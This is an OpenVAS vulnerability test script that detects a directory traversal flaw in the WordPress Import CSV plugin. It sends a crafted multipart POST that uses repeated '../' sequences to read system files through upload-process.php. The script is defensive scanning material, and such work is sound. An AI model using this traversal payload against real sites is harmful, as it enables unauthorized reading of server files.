###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_import_csv_dir_trav_vuln.nasl 5626 2017-03-20 15:16:30Z cfi $
#
# Wordpress Import CSV Directory Traversal Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807626");
  script_version("$Revision: 5626 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:16:30 +0100 (Mon, 20 Mar 2017) $");
  script_tag(name:"creation_date", value:"2016-04-12 18:40:48 +0530 (Tue, 12 Apr 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Wordpress Import CSV Directory Traversal Vulnerability");

  script_tag(name:"summary" , value:"This host is installed with Wordpress
  Import CSV plugin and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to read arbitrary files.");

  script_tag(name:"insight", value:"The flaw exists due to improper sanitization
  of 'url' parameter in 'upload-process.php' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files.

  Impact Level: System/Application");

  script_tag(name:"affected" , value:"Wordpress Import CSV plugin 1.0");

  script_tag(name:"solution", value:"No solution or patch is available as of
  24th January, 2017. Information regarding this issue will be updated once the
  solution details are available.
  For updates refer to https://wordpress.org/plugins/import-csv-files/");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39576/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

# Get HTTPs Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Get host name or IP
host = http_host_name(port:http_port);
if(!host){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{

  ## Construct vulnerable url
  url = dir + '/wp-content/plugins/xml-and-csv-import-in-article-content/upload-process.php';

  ##Post data
  postData = string('-----------------------------615182693467738782470537896\r\n',
		    'Content-Disposition: form-data; name="type"\r\n',
		    '\r\n',
		    'url\r\n',
		    '-----------------------------615182693467738782470537896\r\n',
		    'Content-Disposition: form-data; name="fichier"\r\n',
		    '\r\n',
		    crap(data: "../", length: 3*15) + files[file], '\r\n',
		    '-----------------------------615182693467738782470537896\r\n',
		    'Content-Disposition: form-data; name="submit"\r\n',
		    '\r\n',
		    'Submit Query\r\n');

  ##Construct snd request
  sndReq = string("POST ",url," HTTP/1.1\r\n",
                  "Host: ",host,"\r\n",
		  "Content-Type: multipart/form-data; boundary=---------------------------615182693467738782470537896\r\n",
		  "Content-Length: ", strlen(postData), "\r\n\r\n",
                  postData);

  ##Send and Receive Response
  res = http_keepalive_send_recv(port:http_port, data:sndReq);

  ## Confirm exploit
  if(egrep(string:res, pattern:file, icase:TRUE) && 
     res =~ "HTTP/1.. 200 OK")
  {
    report = report_vuln_url( port:http_port, url:url );
    security_message(port:http_port, data:report);
    exit(0);
  }
}
